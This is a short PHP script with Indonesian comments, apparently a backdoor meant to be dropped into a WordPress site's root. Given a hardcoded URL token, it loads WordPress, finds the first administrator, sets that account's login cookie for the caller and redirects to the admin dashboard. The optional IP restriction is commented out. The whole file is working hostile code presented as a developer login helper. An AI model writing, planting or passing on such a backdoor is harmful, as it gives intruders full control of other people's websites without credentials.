<?php
// Aktifkan debugging (hapus ini setelah selesai)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// === KONFIGURASI ===
$secret_token = "seopjpteam123@@"; // Ganti dengan token unik
$allowed_ip = "123.123.123.123";     // Optional: IP developer

// === VALIDASI TOKEN ===
if (!isset($_GET['token']) || $_GET['token'] !== $secret_token) {
    die("❌ Unauthorized: Token salah atau tidak ada.");
}

// === BATASI BERDASARKAN IP (Opsional) ===
/*
if ($_SERVER['REMOTE_ADDR'] !== $allowed_ip) {
    die("❌ Access denied: IP tidak diizinkan.");
}
*/

// === PANGGIL WORDPRESS ===
$mr = $_SERVER["DOCUMENT_ROOT"];
@chdir($mr);

if (!file_exists("wp-load.php")) {
    die("❌ Gagal memuat WordPress (wp-load.php tidak ditemukan).");
}

require_once "wp-load.php";

// === CARI ADMIN PERTAMA ===
$wp_user_query = new WP_User_Query([
    "role" => "Administrator",
    "number" => 1,
    "fields" => "ID",
]);
$results = $wp_user_query->get_results();

if (!isset($results[0])) {
    die("❌ Tidak ada akun administrator ditemukan.");
}

// === LOGIN SEBAGAI ADMIN ===
wp_set_auth_cookie($results[0]);
wp_redirect(admin_url());
exit();
?>
